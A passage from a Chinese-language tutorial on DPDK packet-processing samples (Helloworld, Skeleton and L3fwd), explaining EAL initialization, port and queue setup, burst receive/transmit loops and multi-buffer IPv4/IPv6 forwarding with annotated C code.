class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br></pre></td></tr></table></figure><p>入口参数是启动DPDK的命令行，可以是长长的一串很复杂的设置。对于Helloworld这个实例，最需要的参数是”-c <core mask>“ ，线程掩码(core mask)指定了需要参与运行的线程集合。<code>rte_eal_init</code>本身完成的工作很复杂，它读取入口参数，解析并保存作为DPDK运行的系统信息，依赖这些信息，构建一个针对包处理设计的运行环境，主要动作分解如下：</core></p><ul><li>配置初始化</li><li>内存初始化</li><li>内存池初始化</li><li>队列初始化</li><li>告警初始化</li><li>中断初始化</li><li>PCI初始化</li><li>定时器初始化</li><li>检测内存本地化(NUMA)</li><li>插件初始化</li><li>主线程初始化</li><li>轮询设备初始化</li><li>建立主从线程通道</li><li>将从线程设置在等待模式</li><li>PCI设备的探测与初始化</li></ul><h6 id="多核运行初始化"><a href="#多核运行初始化" class="headerlink" title="多核运行初始化"></a>多核运行初始化</h6><p>DPDK面向多核设计，程序会试图独占运行在逻辑核(lcore)上。<code>main</code>函数里重要的是启动多核运行环境。<code>RTE_LCORE_FOREACH_WORKER(lcore_id)</code>，遍历所有EAL指定可以使用的lcore，然后通过<code>rte_eal_remote_launch</code>在每个lcore上，启动被指定的线程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rte_eal_remote_launch</span><span class="params">(<span class="keyword">int</span> (*f)(<span class="keyword">void</span> *),<span class="keyword">void</span> *arg,<span class="keyword">unsigned</span> slave_id)</span></span>;</span><br></pre></td></tr></table></figure><p>第一个参数是从线程，是被征召的线程</p><p>第二个参数是传给从线程的参数</p><p>第三个参数是指定的逻辑核，从线程会执行在这个core上</p><p><code>rte_eal_remote_launch(lcore_hello, NULL, lcore_id);</code></p><p>其中，参数lcore_id指定了从线程ID，运行入口函数lcore_hello，运行函数lcore_hello，它读取自己的逻辑核编号(lcore_id)，打印出”hello from core #”</p><h5 id="Skeleton"><a href="#Skeleton" class="headerlink" title="Skeleton"></a>Skeleton</h5><p>skeleton的设计初衷是实现一个最简单的报文收发示例，对收入报文不做任何处理直接发送。可以用于平台的单核报文出入性能测试。</p><p>主要处理函数<code>main</code>处理逻辑如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The main function, which does initialization and calls the per-lcore</span></span><br><span class="line"><span class="comment"> * functions.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rte_mempool</span> *<span class="title">mbuf_pool</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> nb_ports;</span><br><span class="line"><span class="keyword">uint16_t</span> portid;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Initializion the Environment Abstraction Layer (EAL). 8&lt; */</span></span><br><span class="line"><span class="keyword">int</span> ret = rte_eal_init(argc, argv);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">rte_exit(EXIT_FAILURE, <span class="string">"Error with EAL initialization\n"</span>);</span><br><span class="line"><span class="comment">/* &gt;8 End of initialization the Environment Abstraction Layer (EAL). */</span></span><br><span class="line"></span><br><span class="line">argc -= ret;</span><br><span class="line">argv += ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check that there is an even number of ports to send/receive on. */</span></span><br><span class="line">nb_ports = rte_eth_dev_count_avail();</span><br><span class="line"><span class="keyword">if</span> (nb_ports &lt; <span class="number">2</span> || (nb_ports &amp; <span class="number">1</span>))</span><br><span class="line">rte_exit(EXIT_FAILURE, <span class="string">"Error: number of ports must be even\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Creates a new mempool in memory to hold the mbufs. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocates mempool to hold the mbufs. 8&lt; */</span></span><br><span class="line">mbuf_pool = rte_pktmbuf_pool_create(<span class="string">"MBUF_POOL"</span>, NUM_MBUFS * nb_ports,</span><br><span class="line">MBUF_CACHE_SIZE, <span class="number">0</span>, RTE_MBUF_DEFAULT_BUF_SIZE, rte_socket_id());</span><br><span class="line"><span class="comment">/* &gt;8 End of allocating mempool to hold mbuf. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mbuf_pool == <span class="literal">NULL</span>)</span><br><span class="line">rte_exit(EXIT_FAILURE, <span class="string">"Cannot create mbuf pool\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Initializing all ports. 8&lt; */</span></span><br><span class="line">RTE_ETH_FOREACH_DEV(portid)</span><br><span class="line"><span class="keyword">if</span> (port_init(portid, mbuf_pool) != <span class="number">0</span>)</span><br><span class="line">rte_exit(EXIT_FAILURE, <span class="string">"Cannot init port %"</span>PRIu16 <span class="string">"\n"</span>,</span><br><span class="line">portid);</span><br><span class="line"><span class="comment">/* &gt;8 End of initializing all ports. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (rte_lcore_count() &gt; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nWARNING: Too many lcores enabled. Only 1 used.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Call lcore_main on the main core only. Called on single lcore. 8&lt; */</span></span><br><span class="line">lcore_main();</span><br><span class="line"><span class="comment">/* &gt;8 End of called on single lcore. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* clean up the EAL */</span></span><br><span class="line">rte_eal_cleanup();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先调用<code>rte_eal_init</code>初始化运行环境。检查网络接口数，据此分配内存池<code>rte_pktmbuf_pool_create</code>，入口参数是指定<code>rte_socket_id()</code>，考虑了本地内存使用的范例，调用<code>port_init(portid, mbuf_pool)</code>初始化网口的配置，最后调用<code>lcore_main()</code>进行主处理流程。</p><p>网口初始化流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">port_init(<span class="keyword">uint8_t</span> port,struct rte_mempool *mbuf_pool)</span><br></pre></td></tr></table></figure><p>首先对指定端口设置队列数，本例指定为单队列。在收发两个方向上，基于端口与队列进行配置设置，缓冲区进行关联设置。</p><p>网口设置：对指定端口设置接收、发送方向的队列数目。依据配置信息来指定端口功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rte_eth_dev_configure</span><span class="params">(<span class="keyword">uint8_t</span> port_id,<span class="keyword">uint16_t</span> nb_rx_q,<span class="keyword">uint16_t</span> nb_tx_q,<span class="keyword">const</span> struct rte_eth_conf *dev_conf)</span></span></span><br></pre></td></tr></table></figure><p>队列初始化：对指定端口的某个队列，指定内存、描述符数量、报文缓冲区、并且对队列进行配置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rte_eth_rx_queue_setup</span><span class="params">(<span class="keyword">uint8_t</span> port_id, <span class="keyword">uint16_t</span> rx_queue_id,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">uint16_t</span> nb_rx_desc, <span class="keyword">unsigned</span> <span class="keyword">int</span> socket_id,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">const</span> struct rte_eth_rxconf *rx_conf,</span></span></span><br><span class="line"><span class="function"><span class="params"> struct rte_mempool *mp)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rte_eth_tx_queue_setup</span><span class="params">(<span class="keyword">uint8_t</span> port_id, <span class="keyword">uint16_t</span> tx_queue_id,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">uint16_t</span> nb_tx_desc, <span class="keyword">unsigned</span> <span class="keyword">int</span> socket_id,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">const</span> struct rte_eth_txconf *tx_conf)</span></span></span><br></pre></td></tr></table></figure><p>网口设置：初始化配置结束后，启动端口<code>int rte_eth_dev_start(uint8_t port_id)；</code>完成后，读取 MAC 地址，打开网卡的混杂模式设置，允许所有报文进入。</p><p><code>port_init</code>处理逻辑如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Main functional part of port initialization. 8&lt; */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span></span><br><span class="line">port_init(<span class="keyword">uint16_t</span> port, struct rte_mempool *mbuf_pool)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rte_eth_conf</span> <span class="title">port_conf</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint16_t</span> rx_rings = <span class="number">1</span>, tx_rings = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">uint16_t</span> nb_rxd = RX_RING_SIZE;</span><br><span class="line"><span class="keyword">uint16_t</span> nb_txd = TX_RING_SIZE;</span><br><span class="line"><span class="keyword">int</span> retval;</span><br><span class="line"><span class="keyword">uint16_t</span> q;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rte_eth_dev_info</span> <span class="title">dev_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rte_eth_txconf</span> <span class="title">txconf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!rte_eth_dev_is_valid_port(port))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;port_conf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct rte_eth_conf));</span><br><span class="line"></span><br><span class="line">retval = rte_eth_dev_info_get(port, &amp;dev_info);</span><br><span class="line"><span class="keyword">if</span> (retval != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Error during getting device (port %u) info: %s\n"</span>,</span><br><span class="line">port, strerror(-retval));</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dev_info.tx_offload_capa &amp; RTE_ETH_TX_OFFLOAD_MBUF_FAST_FREE)</span><br><span class="line">port_conf.txmode.offloads |=</span><br><span class="line">RTE_ETH_TX_OFFLOAD_MBUF_FAST_FREE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Configure the Ethernet device. */</span></span><br><span class="line">retval = rte_eth_dev_configure(port, rx_rings, tx_rings, &amp;port_conf);</span><br><span class="line"><span class="keyword">if</span> (retval != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">retval = rte_eth_dev_adjust_nb_rx_tx_desc(port, &amp;nb_rxd, &amp;nb_txd);</span><br><span class="line"><span class="keyword">if</span> (retval != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate and set up 1 RX queue per Ethernet port. */</span></span><br><span class="line"><span class="keyword">for</span> (q = <span class="number">0</span>; q &lt; rx_rings; q++) &#123;</span><br><span class="line">retval = rte_eth_rx_queue_setup(port, q, nb_rxd,</span><br><span class="line">rte_eth_dev_socket_id(port), <span class="literal">NULL</span>, mbuf_pool);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">txconf = dev_info.default_txconf;</span><br><span class="line">txconf.offloads = port_conf.txmode.offloads;</span><br><span class="line"><span class="comment">/* Allocate and set up 1 TX queue per Ethernet port. */</span></span><br><span class="line"><span class="keyword">for</span> (q = <span class="number">0</span>; q &lt; tx_rings; q++) &#123;</span><br><span class="line">retval = rte_eth_tx_queue_setup(port, q, nb_txd,</span><br><span class="line">rte_eth_dev_socket_id(port), &amp;txconf);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Starting Ethernet port. 8&lt; */</span></span><br><span class="line">retval = rte_eth_dev_start(port);</span><br><span class="line"><span class="comment">/* &gt;8 End of starting of ethernet port. */</span></span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Display the port MAC address. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rte_ether_addr</span> <span class="title">addr</span>;</span></span><br><span class="line">retval = rte_eth_macaddr_get(port, &amp;addr);</span><br><span class="line"><span class="keyword">if</span> (retval != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Port %u MAC: %02"</span> PRIx8 <span class="string">" %02"</span> PRIx8 <span class="string">" %02"</span> PRIx8</span><br><span class="line">   <span class="string">" %02"</span> PRIx8 <span class="string">" %02"</span> PRIx8 <span class="string">" %02"</span> PRIx8 <span class="string">"\n"</span>,</span><br><span class="line">port, RTE_ETHER_ADDR_BYTES(&amp;addr));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Enable RX in promiscuous mode for the Ethernet device. */</span></span><br><span class="line">retval = rte_eth_promiscuous_enable(port);</span><br><span class="line"><span class="comment">/* End of setting RX port in promiscuous mode. */</span></span><br><span class="line"><span class="keyword">if</span> (retval != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>网口收发报文循环收发在<code>lcore_main</code>中实现，为保证性能，首先检测CPU与网卡的Socket是否最优适配。数据收发循环非常简单，为高速报文进出定义了burst的收发函数如下，四个参数意义非常直观：端口、队列、报文缓冲区以及收发包数。</p><p>基于端口队列的报文收发函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint16_t</span> <span class="title">rte_eth_rx_burst</span><span class="params">(<span class="keyword">uint8_t</span> port_id, <span class="keyword">uint16_t</span> queue_id,</span></span></span><br><span class="line"><span class="function"><span class="params">struct rte_mbuf **rx_pkts, <span class="keyword">const</span> <span class="keyword">uint16_t</span> nb_pkts)</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint16_t</span> <span class="title">rte_eth_tx_burst</span><span class="params">(<span class="keyword">uint8_t</span> port_id, <span class="keyword">uint16_t</span> queue_id,</span></span></span><br><span class="line"><span class="function"><span class="params">struct rte_mbuf **tx_pkts, <span class="keyword">uint16_t</span> nb_pkts)</span></span></span><br></pre></td></tr></table></figure><p>这就构成了最基本的DPDK报文收发展示。可以看到，此处不涉及任何具体网卡形态，软件接口对硬件没有依赖。</p><p><code>lcore_main</code>处理逻辑如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Basic forwarding application lcore. 8&lt; */</span></span><br><span class="line"><span class="keyword">static</span> __rte_noreturn <span class="keyword">void</span></span><br><span class="line">lcore_main(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">uint16_t</span> port;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Check that the port is on the same NUMA node as the polling thread</span></span><br><span class="line"><span class="comment"> * for best performance.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">RTE_ETH_FOREACH_DEV(port)</span><br><span class="line"><span class="keyword">if</span> (rte_eth_dev_socket_id(port) &gt;= <span class="number">0</span> &amp;&amp;</span><br><span class="line">rte_eth_dev_socket_id(port) !=</span><br><span class="line">(<span class="keyword">int</span>)rte_socket_id())</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"WARNING, port %u is on remote NUMA node to "</span></span><br><span class="line"><span class="string">"polling thread.\n\tPerformance will "</span></span><br><span class="line"><span class="string">"not be optimal.\n"</span>, port);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nCore %u forwarding packets. [Ctrl+C to quit]\n"</span>,</span><br><span class="line">rte_lcore_id());</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Main work of application loop. 8&lt; */</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Receive packets on a port and forward them on the paired</span></span><br><span class="line"><span class="comment"> * port. The mapping is 0 -&gt; 1, 1 -&gt; 0, 2 -&gt; 3, 3 -&gt; 2, etc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">RTE_ETH_FOREACH_DEV(port) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get burst of RX packets, from first port of pair. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rte_mbuf</span> *<span class="title">bufs</span>[<span class="title">BURST_SIZE</span>];</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint16_t</span> nb_rx = rte_eth_rx_burst(port, <span class="number">0</span>,</span><br><span class="line">bufs, BURST_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(nb_rx == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Send burst of TX packets, to second port of pair. */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint16_t</span> nb_tx = rte_eth_tx_burst(port ^ <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">bufs, nb_rx);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Free any unsent packets. */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(nb_tx &lt; nb_rx)) &#123;</span><br><span class="line"><span class="keyword">uint16_t</span> buf;</span><br><span class="line"><span class="keyword">for</span> (buf = nb_tx; buf &lt; nb_rx; buf++)</span><br><span class="line">rte_pktmbuf_free(bufs[buf]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &gt;8 End of loop. */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="L3fwd"><a href="#L3fwd" class="headerlink" title="L3fwd"></a>L3fwd</h5><p>L3fwd是发布DPDK性能测试的例子。如果将PCIE插槽上填满高速网卡，将网口与大流量测试仪表连接，他能展示在双路服务器平台具备<code>200Gbit/s</code>的转发能力。数据包被收入系统后，会查询IP报文头部，依据目标地址进行路由查找，发现目的端口，修改IP头部后，将报文从目的端口送出。路由查找有两种方式，一种是基于目标IP地址的完全匹配(<code>exact match</code>)，另一种是基于路由表的最长掩码匹配(<code>Longest Prefix Match,LPM</code>)。</p><p>启动这个例子，指定命令参数格式如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build/l3fwd [EAL options] -- -p PORTMASK [-P] --config(port,queue,lcore) [,(port,queue,lcore)]</span><br></pre></td></tr></table></figure><p>命令参数分为两个部分，以”—“为分界线，分界线右边的参数是三层转发的私有命令选项。左边是DPDK的<code>EAL Options</code></p><ul><li>[EAL Options]是DPDK运行环境的输入配置选项，输入命令会交给<code>rte_eal_init</code>处理</li><li>PORTMASK依据掩码选择端口，DPDK启动时会搜索系统认识的PCIe设备，依据黑白名单原则来决定是否接管，早期版本可能会接管所有端口，断开网络连接。现在可通过脚本绑定。</li><li>config选项指定(port,queue,lcore)，用指定线程处理对应的端口的队列。要实现<code>200Gbit/s</code>的转发，需要大量线程(核)参与，并行转发。</li></ul><p>主线程<code>main</code>的处理流程如下所述：</p><ul><li>初始化运行环境：<code>rte_eal_init(argc,argv)</code></li><li>分析入参：<code>parse_args(argc,argv)</code></li><li>初始化lcore与port配置</li><li>端口与队列初始化</li><li>端口启动，使能混杂模式</li><li>启动从线程，令其运行<code>main_loop()</code></li></ul><p>从线程执行<code>main_loop()</code>的处理流程如下所述：</p><ul><li>读取自己的lcore信息完成配置</li><li>读取关联的接收与发送队列信息</li><li>进行循环处理：<ul><li>向指定队列批量发送报文</li><li>从指定队列批量接收报文</li><li>批量转发接收到的报文</li></ul></li></ul><p>批量转发接收到的报文是处理的主体，提供了基于Hash的完全匹配转发，也可以基于LPM进行转发。转发路由查找方式可以由编译配置选择。</p><p>下面的例子包括基于<code>multi buffer</code>原理的代码实现，在<code>#if(ENABLE_MULTI_BUFFER_OPTIMIZE == 1)</code>的路径下，一次处理8个报文。它的实现有效利用了处理器内部的乱序执行和并行处理能力，能显著提高转发性能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j += <span class="number">8</span>) &#123;</span><br><span class="line">     <span class="keyword">uint32_t</span> pkt_type =</span><br><span class="line">     pkts_burst[j]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">1</span>]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">2</span>]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">3</span>]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">4</span>]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">5</span>]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">6</span>]-&gt;packet_type &amp;</span><br><span class="line">     pkts_burst[j+<span class="number">7</span>]-&gt;packet_type;</span><br><span class="line"> <span class="keyword">if</span> (pkt_type &amp; RTE_PTYPE_L3_IPV4) &#123;</span><br><span class="line"> simple_ipv4_fwd_8pkts(&amp;pkts_burst[j], portid, qconf);</span><br><span class="line"> &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pkt_type &amp; RTE_PTYPE_L3_IPV6) &#123;</span><br><span class="line"> simple_ipv6_fwd_8pkts(&amp;pkts_burst[j], portid, qconf);</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">1</span>],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">2</span>],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">3</span>],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">4</span>],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">5</span>],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">6</span>],portid, qconf);</span><br><span class="line">     l3fwd_simple_forward(pkts_burst[j+<span class="number">7</span>],portid, qconf);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">for</span> (; j &lt; nb_rx ; j++) &#123;</span><br><span class="line"> l3fwd_simple_forward(pkts_burst[j],portid, qconf);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>依据IP头部的五元组信息，利用<code>rte_hash_lookup</code>来查询目标端口</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mask0 = _mm_set_epi32(ALL_32_BITS, ALL_32_BITS, ALL_32_BITS, BIT_8_TO_15);</span><br><span class="line">ipv4_hdr = (<span class="keyword">uint8_t</span> *)ipv4_hdr + offsetof(struct ipv4_hdr, time_to_live);</span><br><span class="line">__m128i data = _mm_loadu_si128((__m128i*)(ipv4_hdr));</span><br><span class="line"><span class="comment">/* Get 5 tuple: dst port, src port, dst IP address, src IP address and protocol */</span></span><br><span class="line">key.xmm = _mm_and_si128(data, mask0);</span><br><span class="line"><span class="comment">/* Find destination port */</span></span><br><span class="line">ret = rte_hash_lookup(ipv4_l3fwd_lookup_struct, (<span class="keyword">const</span> <span class="keyword">void</span> 